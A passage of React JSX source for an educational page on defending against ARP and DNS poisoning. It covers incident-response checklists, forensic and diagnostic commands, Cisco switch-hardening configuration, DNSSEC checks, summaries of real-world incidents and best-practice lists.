                      <ListItem sx={{ py: 0 }}><ListItemText primary="• Capture network traffic (if possible)" /></ListItem>
                      <ListItem sx={{ py: 0 }}><ListItemText primary="• Collect affected system ARP caches" /></ListItem>
                      <ListItem sx={{ py: 0 }}><ListItemText primary="• Check DNS resolver logs" /></ListItem>
                      <ListItem sx={{ py: 0 }}><ListItemText primary="• Review DHCP lease records" /></ListItem>
                      <ListItem sx={{ py: 0 }}><ListItemText primary="• Document timeline of events" /></ListItem>
                    </List>
                  </Paper>
                </Grid>
                <Grid item xs={12} md={6}>
                  <Paper sx={{ p: 2, bgcolor: alpha("#f59e0b", 0.03), borderRadius: 2, height: "100%" }}>
                    <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#f59e0b", mb: 1 }}>Impact Assessment</Typography>
                    <List dense>
                      <ListItem sx={{ py: 0 }}><ListItemText primary="• Identify all potentially affected users" /></ListItem>
                      <ListItem sx={{ py: 0 }}><ListItemText primary="• Determine what data may have been intercepted" /></ListItem>
                      <ListItem sx={{ py: 0 }}><ListItemText primary="• Check for credential usage from unusual locations" /></ListItem>
                      <ListItem sx={{ py: 0 }}><ListItemText primary="• Review financial transactions during attack window" /></ListItem>
                      <ListItem sx={{ py: 0 }}><ListItemText primary="• Assess if any systems were further compromised" /></ListItem>
                    </List>
                  </Paper>
                </Grid>
              </Grid>

              {/* Remediation */}
              <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>Phase 3: Remediation & Recovery</Typography>
              <TableContainer component={Paper} sx={{ borderRadius: 2, mb: 3 }}>
                <Table size="small">
                  <TableHead>
                    <TableRow sx={{ bgcolor: alpha("#22c55e", 0.1) }}>
                      <TableCell sx={{ fontWeight: 700 }}>Action</TableCell>
                      <TableCell sx={{ fontWeight: 700 }}>Priority</TableCell>
                      <TableCell sx={{ fontWeight: 700 }}>Details</TableCell>
                    </TableRow>
                  </TableHead>
                  <TableBody>
                    {[
                      { action: "Force Password Resets", priority: "Critical", detail: "All users who used the network during attack window" },
                      { action: "Revoke Active Sessions", priority: "Critical", detail: "Invalidate all tokens, cookies, and sessions" },
                      { action: "Rotate API Keys", priority: "High", detail: "Any API keys that may have been transmitted" },
                      { action: "Enable 2FA", priority: "High", detail: "For all accounts accessed during attack" },
                      { action: "Deploy DAI/DHCP Snooping", priority: "High", detail: "Prevent future attacks" },
                      { action: "Increase Monitoring", priority: "Medium", detail: "Enhanced logging for 30+ days" },
                      { action: "User Notification", priority: "Medium", detail: "Inform affected users about potential exposure" },
                      { action: "Post-Incident Review", priority: "Medium", detail: "Document lessons learned, update procedures" },
                    ].map((row) => (
                      <TableRow key={row.action}>
                        <TableCell sx={{ fontWeight: 600 }}>{row.action}</TableCell>
                        <TableCell>
                          <Chip 
                            label={row.priority} 
                            size="small" 
                            sx={{ 
                              bgcolor: row.priority === "Critical" ? alpha("#ef4444", 0.1) : 
                                       row.priority === "High" ? alpha("#f59e0b", 0.1) : alpha("#3b82f6", 0.1),
                              color: row.priority === "Critical" ? "#ef4444" : 
                                     row.priority === "High" ? "#f59e0b" : "#3b82f6",
                              fontWeight: 600 
                            }} 
                          />
                        </TableCell>
                        <TableCell>{row.detail}</TableCell>
                      </TableRow>
                    ))}
                  </TableBody>
                </Table>
              </TableContainer>

              {/* Forensic Commands */}
              <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>Forensic Investigation Commands</Typography>
              <Grid container spacing={2}>
                <Grid item xs={12} md={6}>
                  <Paper sx={{ p: 2, bgcolor: alpha("#000", 0.02), borderRadius: 2 }}>
                    <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1 }}>Wireshark Analysis</Typography>
                    <Box sx={{ fontFamily: "monospace", fontSize: "0.75rem", bgcolor: alpha("#000", 0.05), p: 1.5, borderRadius: 1, overflow: "auto" }}>
                      {`# Find ARP spoofing
arp.duplicate-address-detected

# Find gratuitous ARP
arp.isgratuitous == 1

# Multiple MACs for one IP
Statistics > Endpoints > Ethernet

# DNS queries to suspicious servers
dns && !dns.resp.addr == "expected_dns_ip"`}
                    </Box>
                  </Paper>
                </Grid>
                <Grid item xs={12} md={6}>
                  <Paper sx={{ p: 2, bgcolor: alpha("#000", 0.02), borderRadius: 2 }}>
                    <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1 }}>Switch Forensics (Cisco)</Typography>
                    <Box sx={{ fontFamily: "monospace", fontSize: "0.75rem", bgcolor: alpha("#000", 0.05), p: 1.5, borderRadius: 1, overflow: "auto" }}>
                      {`# View DAI logs
show ip arp inspection log

# Check for multiple MACs
show mac address-table count

# View DHCP snooping bindings
show ip dhcp snooping binding

# Port security violations
show port-security`}
                    </Box>
                  </Paper>
                </Grid>
              </Grid>
            </Paper>

            {/* ==================== DEFENSE CONTROLS ==================== */}
            <Paper id="defense" sx={{ p: 4, mb: 4, borderRadius: 3, border: `1px solid ${alpha("#22c55e", 0.1)}` }}>
              <Typography variant="h4" sx={{ fontWeight: 800, mb: 3, display: "flex", alignItems: "center", gap: 1 }}>
                <ShieldIcon sx={{ color: "#22c55e" }} />
                Defense-in-Depth Strategy
              </Typography>

              <Typography variant="body1" sx={{ mb: 3, lineHeight: 1.8 }}>
                Effective protection against ARP and DNS attacks requires multiple layers of defense, from network
                infrastructure controls to endpoint security measures.
              </Typography>

              <Grid container spacing={3}>
                <Grid item xs={12} md={4}>
                  <Paper sx={{ p: 3, bgcolor: alpha("#22c55e", 0.03), borderRadius: 2, height: "100%" }}>
                    <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#22c55e" }}>
                      Network Layer
                    </Typography>
                    <List dense>
                      {[
                        "DHCP snooping on switches",
                        "Dynamic ARP Inspection (DAI)",
                        "IP Source Guard",
                        "Port security",
                        "Network segmentation (VLANs)",
                        "802.1X authentication",
                      ].map((item, idx) => (
                        <ListItem key={idx}>
                          <ListItemIcon><CheckCircleIcon sx={{ color: "#22c55e", fontSize: 18 }} /></ListItemIcon>
                          <ListItemText primary={item} />
                        </ListItem>
                      ))}
                    </List>
                  </Paper>
                </Grid>
                <Grid item xs={12} md={4}>
                  <Paper sx={{ p: 3, bgcolor: alpha("#3b82f6", 0.03), borderRadius: 2, height: "100%" }}>
                    <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#3b82f6" }}>
                      DNS Security
                    </Typography>
                    <List dense>
                      {[
                        "DNSSEC validation",
                        "DNS over HTTPS (DoH)",
                        "DNS over TLS (DoT)",
                        "Trusted recursive resolvers",
                        "DNS query logging",
                        "Response Policy Zones (RPZ)",
                      ].map((item, idx) => (
                        <ListItem key={idx}>
                          <ListItemIcon><CheckCircleIcon sx={{ color: "#3b82f6", fontSize: 18 }} /></ListItemIcon>
                          <ListItemText primary={item} />
                        </ListItem>
                      ))}
                    </List>
                  </Paper>
                </Grid>
                <Grid item xs={12} md={4}>
                  <Paper sx={{ p: 3, bgcolor: alpha("#8b5cf6", 0.03), borderRadius: 2, height: "100%" }}>
                    <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#8b5cf6" }}>
                      Endpoint & Monitoring
                    </Typography>
                    <List dense>
                      {[
                        "Static ARP entries for gateways",
                        "ARP monitoring tools",
                        "Certificate pinning",
                        "HSTS preloading",
                        "EDR with network monitoring",
                        "Baseline traffic analysis",
                      ].map((item, idx) => (
                        <ListItem key={idx}>
                          <ListItemIcon><CheckCircleIcon sx={{ color: "#8b5cf6", fontSize: 18 }} /></ListItemIcon>
                          <ListItemText primary={item} />
                        </ListItem>
                      ))}
                    </List>
                  </Paper>
                </Grid>
              </Grid>
            </Paper>

            {/* ==================== SWITCH SECURITY ==================== */}
            <Paper id="switch-security" sx={{ p: 4, mb: 4, borderRadius: 3, border: `1px solid ${alpha(accent, 0.1)}` }}>
              <Typography variant="h4" sx={{ fontWeight: 800, mb: 3, display: "flex", alignItems: "center", gap: 1 }}>
                <RouterIcon sx={{ color: accent }} />
                Switch Security Features
              </Typography>

              <TableContainer component={Paper} sx={{ bgcolor: alpha(theme.palette.background.paper, 0.5) }}>
                <Table>
                  <TableHead>
                    <TableRow>
                      <TableCell sx={{ fontWeight: 700 }}>Feature</TableCell>
                      <TableCell sx={{ fontWeight: 700 }}>Description</TableCell>
                      <TableCell sx={{ fontWeight: 700 }}>Cisco IOS Config</TableCell>
                    </TableRow>
                  </TableHead>
                  <TableBody>
                    {switchSecurityFeatures.map((feature, idx) => (
                      <TableRow key={idx}>
                        <TableCell sx={{ fontWeight: 600 }}>{feature.feature}</TableCell>
                        <TableCell>{feature.description}</TableCell>
                        <TableCell><code>{feature.config}</code></TableCell>
                      </TableRow>
                    ))}
                  </TableBody>
                </Table>
              </TableContainer>

              <Box sx={{ mt: 3 }}>
                <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>Sample Cisco Configuration</Typography>
                <CodeBlock
                  language="cisco"
                  code={`! Enable DHCP snooping globally
ip dhcp snooping
ip dhcp snooping vlan 10,20,30

! Configure trusted port (uplink to DHCP server)
interface GigabitEthernet0/1
  ip dhcp snooping trust

! Enable Dynamic ARP Inspection
ip arp inspection vlan 10,20,30

! Configure trusted port for ARP inspection
interface GigabitEthernet0/1
  ip arp inspection trust

! Enable IP Source Guard on access ports
interface range GigabitEthernet0/2-24
  ip verify source

! Configure port security
interface GigabitEthernet0/2
  switchport port-security
  switchport port-security maximum 2
  switchport port-security violation restrict
  switchport port-security mac-address sticky`}
                />
              </Box>
            </Paper>

            {/* ==================== DNS SECURITY ==================== */}
            <Paper id="dns-security" sx={{ p: 4, mb: 4, borderRadius: 3, border: `1px solid ${alpha("#22c55e", 0.1)}` }}>
              <Typography variant="h4" sx={{ fontWeight: 800, mb: 3, display: "flex", alignItems: "center", gap: 1 }}>
                <LockIcon sx={{ color: "#22c55e" }} />
                DNS Security Implementation
              </Typography>

              <Grid container spacing={3}>
                <Grid item xs={12} md={6}>
                  <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>DNSSEC Overview</Typography>
                  <Typography variant="body2" sx={{ mb: 2 }}>
                    DNSSEC adds digital signatures to DNS records, allowing resolvers to verify response authenticity.
                  </Typography>
                  <List dense>
                    {[
                      "RRSIG - Contains digital signatures",
                      "DNSKEY - Contains public signing key",
                      "DS - Delegation signer (chain of trust)",
                      "NSEC/NSEC3 - Authenticated denial of existence",
                    ].map((item, idx) => (
                      <ListItem key={idx}>
                        <ListItemIcon><CheckCircleIcon sx={{ color: "#22c55e", fontSize: 18 }} /></ListItemIcon>
                        <ListItemText primary={item} />
                      </ListItem>
                    ))}
                  </List>
                </Grid>
                <Grid item xs={12} md={6}>
                  <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>Encrypted DNS</Typography>
                  <Typography variant="body2" sx={{ mb: 2 }}>
                    DoH and DoT encrypt DNS queries to prevent eavesdropping and manipulation.
                  </Typography>
                  <List dense>
                    {[
                      "DoH - DNS over HTTPS (port 443)",
                      "DoT - DNS over TLS (port 853)",
                      "Prevents query interception",
                      "Hides DNS queries from network observers",
                    ].map((item, idx) => (
                      <ListItem key={idx}>
                        <ListItemIcon><CheckCircleIcon sx={{ color: "#22c55e", fontSize: 18 }} /></ListItemIcon>
                        <ListItemText primary={item} />
                      </ListItem>
                    ))}
                  </List>
                </Grid>
              </Grid>

              <Box sx={{ mt: 3 }}>
                <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>Verify DNSSEC</Typography>
                <CodeBlock
                  language="bash"
                  code={`# Check if domain has DNSSEC
dig +dnssec example.com

# Verify DNSSEC chain
dig +trace +dnssec example.com

# Check DNSKEY record
dig DNSKEY example.com

# Online validation
# Visit: https://dnsviz.net/`}
                />
              </Box>
            </Paper>

            {/* ==================== TOOLS REFERENCE ==================== */}
            <Paper id="tools" sx={{ p: 4, mb: 4, borderRadius: 3, border: `1px solid ${alpha(accent, 0.1)}` }}>
              <Typography variant="h4" sx={{ fontWeight: 800, mb: 3, display: "flex", alignItems: "center", gap: 1 }}>
                <BuildIcon sx={{ color: accent }} />
                Defensive Tools Reference
              </Typography>

              <Alert severity="info" sx={{ mb: 3 }}>
                <AlertTitle>Defense Focus</AlertTitle>
                These tools are for detection and defense. Always use tools ethically and with proper authorization.
              </Alert>

              <Grid container spacing={2}>
                {toolsEducational.map((tool, idx) => (
                  <Grid item xs={12} md={6} key={idx}>
                    <Paper sx={{ p: 2.5, borderRadius: 2, bgcolor: alpha(accent, 0.02) }}>
                      <Box sx={{ display: "flex", alignItems: "center", gap: 1, mb: 1 }}>
                        <Typography variant="subtitle1" sx={{ fontWeight: 700 }}>{tool.name}</Typography>
                        <Chip label="Defensive" size="small" sx={{ bgcolor: alpha("#22c55e", 0.1), color: "#22c55e" }} />
                      </Box>
                      <Typography variant="body2" color="text.secondary">{tool.purpose}</Typography>
                    </Paper>
                  </Grid>
                ))}
              </Grid>
            </Paper>

            {/* ==================== COMMANDS ==================== */}
            <Paper id="commands" sx={{ p: 4, mb: 4, borderRadius: 3, border: `1px solid ${alpha(accent, 0.1)}` }}>
              <Typography variant="h4" sx={{ fontWeight: 800, mb: 3, display: "flex", alignItems: "center", gap: 1 }}>
                <TerminalIcon sx={{ color: accent }} />
                Essential Commands
              </Typography>

              <Grid container spacing={3}>
                <Grid item xs={12} md={6}>
                  <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>ARP Table Commands</Typography>
                  <CodeBlock
                    language="bash"
                    code={`# Windows - View ARP cache
arp -a

# Windows - Clear ARP cache
arp -d *

# Windows - Add static entry
arp -s 192.168.1.1 aa-bb-cc-dd-ee-ff

# Linux - View neighbor table
ip neigh show

# Linux - Clear specific entry
ip neigh del 192.168.1.1 dev eth0

# Linux - Add static entry
ip neigh add 192.168.1.1 lladdr aa:bb:cc:dd:ee:ff dev eth0 nud permanent

# macOS - View ARP table
arp -a`}
                  />
                </Grid>
                <Grid item xs={12} md={6}>
                  <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>DNS Diagnostic Commands</Typography>
                  <CodeBlock
                    language="bash"
                    code={`# Windows - Display DNS cache
ipconfig /displaydns

# Windows - Clear DNS cache
ipconfig /flushdns

# Windows - Query specific DNS
nslookup example.com 8.8.8.8

# Linux - Query with dig
dig example.com
dig @8.8.8.8 example.com
dig +short example.com
dig +trace example.com

# Linux - Clear systemd cache
systemd-resolve --flush-caches

# Check resolver status
systemd-resolve --status`}
                  />
                </Grid>
              </Grid>

              <Box sx={{ mt: 3 }}>
                <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>Wireshark Filters</Typography>
                <CodeBlock
                  language="wireshark"
                  code={`# ARP traffic
arp

# ARP requests only
arp.opcode == 1

# ARP replies only
arp.opcode == 2

# Gratuitous ARP
arp.isgratuitous == 1

# DNS traffic
dns

# DNS queries
dns.flags.response == 0

# DNS responses
dns.flags.response == 1

# DNS for specific domain
dns.qry.name contains "example.com"

# Suspicious: Multiple MACs for same IP
# (Use Statistics > Endpoints > Ethernet)`}
                />
              </Box>
            </Paper>

            {/* ==================== REAL-WORLD INCIDENTS ==================== */}
            <Paper id="real-incidents" sx={{ p: 4, mb: 4, borderRadius: 3, border: `1px solid ${alpha("#dc2626", 0.1)}` }}>
              <Typography variant="h4" sx={{ fontWeight: 800, mb: 3, display: "flex", alignItems: "center", gap: 1 }}>
                <HistoryIcon sx={{ color: "#dc2626" }} />
                Real-World Incidents & Case Studies
              </Typography>

              <Typography variant="body1" sx={{ mb: 3, lineHeight: 1.8 }}>
                Understanding real attacks helps security professionals recognize similar threats. These incidents 
                demonstrate the significant impact DNS and ARP-based attacks can have on organizations and individuals.
              </Typography>

              <Grid container spacing={3}>
                {/* Major Incidents */}
                {[
                  {
                    title: "2018 MyEtherWallet DNS Hijack",
                    date: "April 2018",
                    type: "BGP Hijacking + DNS",
                    impact: "$150,000+ in cryptocurrency stolen",
                    details: "Attackers hijacked BGP routes for Amazon Route 53 DNS servers, redirecting MyEtherWallet.com traffic to a phishing site. Users who ignored certificate warnings lost their crypto assets.",
                    lessons: ["Always verify HTTPS certificates", "BGP security matters for DNS", "Financial sites need extra DNS protection"],
                    color: "#f59e0b"
                  },
                  {
                    title: "2019 Sea Turtle DNS Hijacking Campaign",
                    date: "2017-2019",
                    type: "Registrar/TLD Compromise",
                    impact: "40+ organizations in 13 countries compromised",
                    details: "Nation-state actors compromised DNS registrars and ccTLDs to intercept email and VPN credentials. Targeted government organizations, energy companies, and telecoms.",
                    lessons: ["Secure registrar accounts with MFA", "Monitor for unauthorized DNS changes", "DNSSEC can detect tampering"],
                    color: "#ef4444"
                  },
                  {
                    title: "2020 SolarWinds + DNS Tunneling",
                    date: "2020",
                    type: "DNS Tunneling for C2",
                    impact: "18,000 organizations affected",
                    details: "Sunburst malware used DNS queries to encoded subdomains (avsvmcloud.com) for command-and-control communications, blending in with normal DNS traffic.",
                    lessons: ["Monitor for anomalous DNS patterns", "DNS tunneling bypasses most firewalls", "Baseline normal DNS behavior"],
                    color: "#8b5cf6"
                  },
                  {
                    title: "2016 Dyn DDoS Attack",
                    date: "October 2016",
                    type: "DNS DDoS via Mirai Botnet",
                    impact: "Twitter, Netflix, Reddit, GitHub offline for hours",
                    details: "Mirai botnet (IoT devices) launched massive DDoS against Dyn DNS provider, causing major internet outages across the US East Coast.",
                    lessons: ["DNS is critical infrastructure", "IoT security affects everyone", "Redundant DNS providers needed"],
                    color: "#3b82f6"
                  },
                  {
                    title: "2010 China/Google BGP Incident",
                    date: "April 2010",
                    type: "BGP Hijacking affecting DNS",
                    impact: "15% of internet routes misdirected for 18 minutes",
                    details: "Chinese ISP advertised incorrect BGP routes, causing traffic destined for US government and military sites (including Google) to be routed through China.",
                    lessons: ["BGP security affects DNS resolution", "Route hijacking can be accidental or malicious", "International internet governance matters"],
                    color: "#22c55e"
                  },
                  {
                    title: "Coffee Shop ARP Poisoning",
                    date: "Ongoing",
                    type: "Local ARP MITM",
                    impact: "Credentials stolen, sessions hijacked",
                    details: "A common attack at coffee shops and hotels where attackers ARP poison to intercept traffic. Often captures HTTP credentials, session cookies, and unencrypted data.",
                    lessons: ["Public WiFi is inherently insecure", "Always use VPN on public networks", "HTTPS Everywhere is essential"],
                    color: "#f97316"
                  },
                ].map((incident, idx) => (
                  <Grid item xs={12} md={6} key={idx}>
                    <Paper sx={{ p: 3, borderRadius: 2, height: "100%", border: `1px solid ${alpha(incident.color, 0.2)}`, bgcolor: alpha(incident.color, 0.02) }}>
                      <Box sx={{ display: "flex", justifyContent: "space-between", alignItems: "flex-start", mb: 2 }}>
                        <Typography variant="h6" sx={{ fontWeight: 700, flex: 1 }}>{incident.title}</Typography>
                        <Chip label={incident.date} size="small" sx={{ bgcolor: alpha(incident.color, 0.1), fontWeight: 600 }} />
                      </Box>
                      <Box sx={{ display: "flex", gap: 1, mb: 2 }}>
                        <Chip label={incident.type} size="small" variant="outlined" />
                        <Chip label={incident.impact} size="small" sx={{ bgcolor: alpha("#ef4444", 0.1), color: "#ef4444", fontWeight: 600 }} />
                      </Box>
                      <Typography variant="body2" color="text.secondary" sx={{ mb: 2, lineHeight: 1.7 }}>
                        {incident.details}
                      </Typography>
                      <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1, color: incident.color }}>Key Lessons:</Typography>
                      <Box component="ul" sx={{ m: 0, pl: 2 }}>
                        {incident.lessons.map((lesson, i) => (
                          <Typography component="li" key={i} variant="caption" color="text.secondary">{lesson}</Typography>
                        ))}
                      </Box>
                    </Paper>
                  </Grid>
                ))}
              </Grid>

              <Alert severity="info" sx={{ mt: 3 }}>
                <AlertTitle>Stay Informed</AlertTitle>
                Monitor resources like CISA alerts, Krebs on Security, and The Record for the latest DNS and network-based attack reports.
              </Alert>
            </Paper>

            {/* ==================== BEST PRACTICES ==================== */}
            <Paper id="best-practices" sx={{ p: 4, mb: 4, borderRadius: 3, border: `1px solid ${alpha("#22c55e", 0.1)}` }}>
              <Typography variant="h4" sx={{ fontWeight: 800, mb: 3, display: "flex", alignItems: "center", gap: 1 }}>
                <TipsAndUpdatesIcon sx={{ color: "#22c55e" }} />
                Best Practices Summary
              </Typography>

              {/* Quick Reference Checklist */}
              <Paper sx={{ p: 3, mb: 4, bgcolor: alpha("#22c55e", 0.05), borderRadius: 2, border: `2px solid ${alpha("#22c55e", 0.2)}` }}>
                <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#22c55e" }}>
                  ✅ Security Posture Checklist
                </Typography>
                <Typography variant="body2" sx={{ mb: 2 }}>
                  Use this checklist to audit your organization's ARP/DNS security posture:
                </Typography>
                <Grid container spacing={2}>
                  {[
                    { category: "Layer 2 Security", items: ["DHCP Snooping enabled", "Dynamic ARP Inspection (DAI)", "Port Security configured", "BPDU Guard on access ports"] },
                    { category: "DNS Security", items: ["DNSSEC validation enabled", "DNS over HTTPS/TLS", "Response Rate Limiting (RRL)", "Recursive queries restricted"] },
                    { category: "Monitoring", items: ["ARP table monitoring", "DNS query logging", "Anomaly detection alerts", "Baseline traffic analysis"] },
                    { category: "Network Segmentation", items: ["VLANs properly configured", "802.1X authentication", "Private VLANs (PVLANs)", "Network access control (NAC)"] },
                  ].map((group, idx) => (
                    <Grid item xs={12} sm={6} md={3} key={idx}>
                      <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1 }}>{group.category}</Typography>
                      {group.items.map((item, i) => (
                        <Box key={i} sx={{ display: "flex", alignItems: "center", gap: 1, mb: 0.5 }}>
                          <Box sx={{ width: 16, height: 16, border: "2px solid", borderColor: alpha("#22c55e", 0.5), borderRadius: 0.5 }} />
                          <Typography variant="caption">{item}</Typography>
                        </Box>
                      ))}
                    </Grid>
                  ))}
                </Grid>
              </Paper>

              <Grid container spacing={3}>
                <Grid item xs={12} md={6}>
                  <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>Network Administrators</Typography>
                  <List dense>
                    {[
                      { text: "Enable DHCP snooping on all VLANs", priority: "Critical" },
                      { text: "Deploy Dynamic ARP Inspection", priority: "Critical" },
                      { text: "Implement 802.1X for network access control", priority: "High" },
                      { text: "Segment networks using VLANs", priority: "High" },
                      { text: "Enable DNSSEC validation on resolvers", priority: "High" },
                      { text: "Monitor for ARP and DNS anomalies", priority: "Medium" },
                      { text: "Keep DNS servers patched and hardened", priority: "Medium" },
                      { text: "Use private VLANs where appropriate", priority: "Medium" },
                      { text: "Disable LLMNR and NBT-NS via GPO", priority: "High" },
                      { text: "Implement DNS sinkholing for known bad domains", priority: "Medium" },
                    ].map((item, idx) => (
                      <ListItem key={idx} sx={{ py: 0.5 }}>
                        <ListItemIcon><CheckCircleIcon sx={{ color: "#22c55e", fontSize: 18 }} /></ListItemIcon>
                        <ListItemText 
                          primary={item.text}
                          secondary={
                            <Chip 
                              label={item.priority} 
                              size="small" 
                              sx={{ 
                                height: 18, 
                                fontSize: "0.65rem",
                                bgcolor: alpha(
                                  item.priority === "Critical" ? "#ef4444" : 
                                  item.priority === "High" ? "#f59e0b" : "#3b82f6", 
                                  0.1
                                ),
                                color: item.priority === "Critical" ? "#ef4444" : 
                                       item.priority === "High" ? "#f59e0b" : "#3b82f6",
                              }} 
                            />
                          }
                        />
                      </ListItem>
                    ))}
                  </List>
                </Grid>
                <Grid item xs={12} md={6}>
                  <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>End Users</Typography>
                  <List dense>
                    {[
                      { text: "Always verify HTTPS and certificate validity", priority: "Critical" },
                      { text: "Use VPN on untrusted/public networks", priority: "Critical" },
                      { text: "Enable encrypted DNS (DoH/DoT)", priority: "High" },
                      { text: "Never ignore certificate warnings", priority: "Critical" },
                      { text: "Be cautious on public Wi-Fi networks", priority: "High" },
                      { text: "Keep systems and browsers updated", priority: "High" },
                      { text: "Use browser extensions like HTTPS Everywhere", priority: "Medium" },
                      { text: "Report suspicious network behavior to IT", priority: "Medium" },
                      { text: "Verify banking/sensitive sites manually", priority: "High" },
                      { text: "Use password managers (immune to phishing)", priority: "High" },
                    ].map((item, idx) => (
                      <ListItem key={idx} sx={{ py: 0.5 }}>
                        <ListItemIcon><CheckCircleIcon sx={{ color: "#22c55e", fontSize: 18 }} /></ListItemIcon>
                        <ListItemText 
                          primary={item.text}
                          secondary={
                            <Chip 
                              label={item.priority} 
                              size="small" 
                              sx={{ 
                                height: 18, 
                                fontSize: "0.65rem",
                                bgcolor: alpha(
                                  item.priority === "Critical" ? "#ef4444" : 
                                  item.priority === "High" ? "#f59e0b" : "#3b82f6", 
                                  0.1
                                ),
                                color: item.priority === "Critical" ? "#ef4444" : 
                                       item.priority === "High" ? "#f59e0b" : "#3b82f6",
                              }} 
                            />
                          }
                        />
                      </ListItem>
                    ))}
                  </List>
                </Grid>
              </Grid>

              {/* Defense in Depth */}
              <Paper sx={{ p: 3, mt: 3, bgcolor: alpha("#3b82f6", 0.03), borderRadius: 2 }}>
                <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#3b82f6" }}>
                  🏰 Defense in Depth: Layered Security
                </Typography>
                <Typography variant="body2" sx={{ mb: 2, lineHeight: 1.8 }}>
                  No single control can prevent all ARP/DNS attacks. Implement <strong>multiple layers</strong> so 
                  that if one fails, others still protect you:
                </Typography>
                <Grid container spacing={2}>
                  {[
                    { layer: "Physical", controls: "Secure physical access to network equipment", color: "#6b7280" },
                    { layer: "Network", controls: "VLANs, DHCP Snooping, DAI, 802.1X", color: "#3b82f6" },
                    { layer: "Transport", controls: "HTTPS, TLS, VPN, DoH/DoT", color: "#8b5cf6" },
                    { layer: "Application", controls: "HSTS, Certificate Pinning, DNSSEC", color: "#22c55e" },
                    { layer: "Monitoring", controls: "IDS/IPS, SIEM, Anomaly Detection", color: "#f59e0b" },
                    { layer: "Response", controls: "Incident Response Plan, Forensics", color: "#ef4444" },
                  ].map((item, idx) => (
                    <Grid item xs={6} md={2} key={idx}>
                      <Box sx={{ textAlign: "center", p: 1, borderLeft: `3px solid ${item.color}`, pl: 2 }}>
                        <Typography variant="subtitle2" sx={{ fontWeight: 700, color: item.color }}>{item.layer}</Typography>
                        <Typography variant="caption" color="text.secondary">{item.controls}</Typography>
                      </Box>
                    </Grid>
                  ))}
                </Grid>
              </Paper>

              <Alert severity="warning" sx={{ mt: 3 }}>
                <AlertTitle>Legal Notice</AlertTitle>
                ARP and DNS attacks against networks without explicit authorization are illegal. Only perform security
                testing in isolated lab environments or with written permission from network owners.
              </Alert>
            </Paper>

            {/* ==================== QUIZ SECTION ==================== */}
            <Box id="quiz" sx={{ mt: 5 }}>
              <QuizSection
                questions={quizPool}
                accentColor={ACCENT_COLOR}
                title="ARP & DNS Poisoning Knowledge Check"
                description="Test your understanding with 10 random questions from a 75-question bank covering ARP/DNS fundamentals, attacks, detection, and defense."
                questionsPerQuiz={QUIZ_QUESTION_COUNT}
              />
            </Box>

            {/* Continue Learning */}
            <Paper sx={{ p: 3, mt: 4, borderRadius: 3, bgcolor: alpha(accent, 0.02) }}>
              <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
                <SchoolIcon sx={{ color: accent }} />
                Continue Your Security Journey
              </Typography>
              <Typography variant="body2" color="text.secondary" sx={{ mb: 2 }}>
                Now that you understand network-layer attacks, explore these related topics:
              </Typography>
              <Grid container spacing={2}>
                {[
                  { title: "Computer Networking", path: "/learn/networking", desc: "Deep dive into protocols" },
                  { title: "OWASP Top 10", path: "/learn/owasp", desc: "Web application security" },
                  { title: "Privilege Escalation", path: "/learn/priv-esc", desc: "Post-exploitation techniques" },
                  { title: "Linux Fundamentals", path: "/learn/linux", desc: "Command line mastery" },
                  { title: "Social Engineering", path: "/learn/social-engineering", desc: "Human-layer attacks" },
                  { title: "Cryptography", path: "/learn/crypto", desc: "Understanding encryption" },
                  { title: "Malware Analysis", path: "/learn/malware", desc: "Threat reverse engineering" },
                  { title: "PCAP Analysis", path: "/learn/pcap", desc: "Network traffic analysis" },
                ].map((item, idx) => (
                  <Grid item xs={6} md={3} key={idx}>
                    <Paper 
                      onClick={() => navigate(item.path)}
                      sx={{ 
                        p: 1.5, 
                        cursor: "pointer", 
                        borderRadius: 2,
                        border: `1px solid ${alpha(accent, 0.1)}`,
                        transition: "all 0.2s",
                        "&:hover": { 
                          bgcolor: alpha(accent, 0.05),
                          borderColor: alpha(accent, 0.3),
                          transform: "translateY(-2px)"
                        }
                      }}
                    >
                      <Typography variant="subtitle2" sx={{ fontWeight: 700 }}>{item.title}</Typography>
                      <Typography variant="caption" color="text.secondary">{item.desc}</Typography>
                    </Paper>
                  </Grid>
                ))}
              </Grid>
            </Paper>

            {/* External Resources */}
            <Paper sx={{ p: 3, mt: 3, borderRadius: 3, border: `1px solid ${alpha("#3b82f6", 0.1)}` }}>
              <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
                <InfoIcon sx={{ color: "#3b82f6" }} />
                External Resources
              </Typography>
              <Grid container spacing={2}>
                {[
                  { name: "Wireshark Wiki - ARP", url: "https://wiki.wireshark.org/AddressResolutionProtocol" },
                  { name: "SANS Reading Room", url: "https://www.sans.org/reading-room/" },
                  { name: "NIST DNS Security Guide", url: "https://csrc.nist.gov/publications/detail/sp/800-81/2/final" },
                  { name: "Cisco DAI Guide", url: "https://www.cisco.com/c/en/us/td/docs/switches/lan/catalyst4500/12-2/25ew/configuration/guide/conf/dynarp.html" },
                ].map((resource, idx) => (
                  <Grid item xs={12} sm={6} md={3} key={idx}>
                    <Chip
                      label={resource.name}
                      component="a"
                      href={resource.url}
                      target="_blank"
                      clickable
                      variant="outlined"
                      sx={{ width: "100%" }}
                    />
                  </Grid>
                ))}
              </Grid>
            </Paper>
          </Grid>
        </Grid>

        {/* Bottom Navigation */}
